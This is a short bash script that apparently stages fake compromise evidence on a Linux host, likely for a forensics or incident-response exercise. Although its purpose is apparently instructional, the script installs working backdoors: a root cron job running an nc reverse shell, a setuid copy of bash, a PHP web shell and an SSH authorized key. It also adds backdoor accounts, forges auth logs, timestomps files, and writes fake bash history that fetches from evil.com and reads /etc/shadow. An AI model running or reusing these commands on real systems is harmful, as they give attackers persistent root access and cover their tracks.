cat > /tmp/recreate.sh << 'EOFSCRIPT'
#!/bin/bash
useradd -m -s /bin/bash matrix && echo "matrix:m123" | chpasswd
useradd -m -s /bin/bash max && echo "max:cleanme" | chpasswd
cp /bin/bash /tmp/bashdoor && chmod +s /tmp/bashdoor
echo "cc: 4111-1111-1111-1111" > /tmp/cc.txt
echo "password: hunter2" > /tmp/creds.txt
echo "root:toor" > /dev/shm/root.hash
mkdir -p /tmp/.stash && echo "matrix private key here" > /tmp/.stash/id_rsa
mkdir -p /home/matrix/secret && echo "stolen data" > /home/matrix/secret/db.txt
logger -p auth.info "Accepted password for matrix from 203.0.113.5 port 4444"
logger -p auth.err "Failed password for root from 10.0.0.99 port 8888"
logger -p auth.warn "Invalid user max from 192.0.2.50 port 12345"
echo "* * * * * root nc -e /bin/bash 192.168.1.7 5555" >> /etc/crontab
mkdir -p /home/matrix/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." > /home/matrix/.ssh/authorized_keys
chmod 600 /home/matrix/.ssh/authorized_keys && chown -R matrix:matrix /home/matrix/.ssh
echo '<?php system($_GET["cmd"]); ?>' > /var/www/backdoor.php
touch -t 200101010000 /tmp/creds.txt
touch -r /etc/passwd /tmp/bashdoor
echo "wget http://evil.com/payload" >> /home/matrix/.bash_history
echo "./payload" >> /home/matrix/.bash_history
echo "cat /etc/shadow" >> /home/matrix/.bash_history
chown matrix:matrix /home/matrix/.bash_history 2>/dev/null
echo "All footprints created!"
EOFSCRIPT
